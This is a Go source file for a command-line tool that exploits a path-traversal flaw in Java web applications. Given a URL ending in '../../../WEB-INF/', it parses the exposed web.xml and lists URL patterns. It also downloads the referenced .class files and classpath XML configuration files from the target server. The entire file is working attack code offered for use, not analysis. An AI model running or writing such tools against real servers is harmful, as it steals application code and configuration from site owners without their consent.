package main

import (
	"flag"
	"fmt"
	"github.com/antchfx/xmlquery"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
)
const webXmlversion = "0.1"

func main() {
	var url string
	flag.StringVar(&url, "u", "", "Vulnerable URL without the web.xml at end. Ex:https://vulnapp/somedir/anotherdir/../../../WEB-INF/")
	version := flag.Bool("v", false, "Prints the current version and exit.")
	flag.Parse()

	if os.Args == nil || len(os.Args) <= 1 {
		fmt.Println("You must provide at least one argument and value")
		fmt.Println("Version:", webXmlversion)
		fmt.Println("Under the SushiWare license.")
		os.Exit(0)
	}

	if *version {
		fmt.Println("Version:", webXmlversion)
		fmt.Println("Under the SushiWare license.")
		os.Exit(0)
	}

	parsexml(url)
	getUrlpattern(url)
	getClasspath(url)


}


func parsexml(url string) {
fmt.Println("Extracting possible class files from web.xml")

webxml, _ := xmlquery.LoadURL(url + "web.xml")

	for _, n := range xmlquery.Find(webxml, "//filter/filter-class") {
		replaceDot := strings.Replace(n.InnerText(),".","/",-1) + ".class"
		downloadClass(url,replaceDot)
	}

}



func getUrlpattern(url string) {
	rootUrl := strings.Split(url,"/")
	webxml, _ := xmlquery.LoadURL(url + "web.xml")
fmt.Println("\nExtracted URL's:")
	for _, n := range xmlquery.Find(webxml, "//url-pattern") {
		if n.InnerText() == "/" || n.InnerText() == "/*"{

		} else {
			fmt.Printf("%s\n", rootUrl[0]+"//"+rootUrl[2] + strings.Replace(n.InnerText(),"*","",-1 ))
		}
	}
}



func getClasspath(url string,){
	webxml, _ := xmlquery.LoadURL(url + "web.xml")
	fmt.Println("\nExtracted XML files:")
	for _, n := range xmlquery.Find(webxml, "//param-value") {
		if strings.Contains(n.InnerText(),"classpath:") {
				classParser := strings.Split(strings.TrimSpace(n.InnerText()),"classpath:")
						for a :=0;a < len(classParser);a++ {
							urlxmlAux := url + "classes"+ classParser[a]
							fmt.Printf("%s\n", urlxmlAux)
							downloadXml(urlxmlAux)
						}
		}
		if strings.Contains(n.InnerText(),"classpath:") && strings.Contains(n.InnerText(),",") {
			classParser := strings.Split(n.InnerText(),",")
				for a :=0;a < len(classParser);a++ {
					//fmt.Printf("%s\n", url + "classes"+ strings.Replace(classParser[a],",","",-1)) //Debug
					urlxmlAux := url + "classes"+ strings.TrimSpace(strings.Replace(classParser[a],"classpath:","", -1))
					fmt.Printf("%s\n", urlxmlAux)
					downloadXml(urlxmlAux)

				}
		}
	}
}



func downloadClass(url string, replaceDot string) {
	dirList := "classes,lib" //class files default dirs. Use comma as the separator to add more directories
	dir := strings.Split(dirList,",")
	for i :=0;i < len(dir);i++ {
		resp, err := http.Get(url + dir[i]+ "/" + replaceDot)
		if err != nil {
			fmt.Printf("", " Unexpected Error")
		} else if resp.StatusCode == 200 {
			fmt.Println("File found and downloaded:",url + dir[i]+ "/" + replaceDot)
			defer resp.Body.Close()
			body, _ := ioutil.ReadAll(resp.Body)
			stringBody := string(body)
			// fmt.Print(stringBody) Debug
			splitFileName := strings.Split(replaceDot, "/")
			getClass := len(splitFileName)
			data := []byte(stringBody)
			ioutil.WriteFile(splitFileName[getClass-1], data, 777)
		} else {
			// fmt.Println("File Not Found:", replaceDot) //Debug
		}
	}
}


func downloadXml(urlxml string) {
	strings.TrimSpace(urlxml)
	xmlNamesplit := strings.Split(urlxml, "/")
	xmlName := len(xmlNamesplit)
	resp, err := http.Get(urlxml)
	if err != nil {
		fmt.Printf("", " Unexpected XML Error")
	} else if resp.StatusCode == 200 {
		fmt.Println("File found and downloaded:", urlxml)
		defer resp.Body.Close()
		body, _ := ioutil.ReadAll(resp.Body)
		stringBody := string(body)
		// fmt.Print(stringBody) Debug
		data := []byte(stringBody)
		ioutil.WriteFile(xmlNamesplit[xmlName-1], data, 777)
	} else {
		// fmt.Println("File Not Found:", replaceDot) //Debug

	}
}
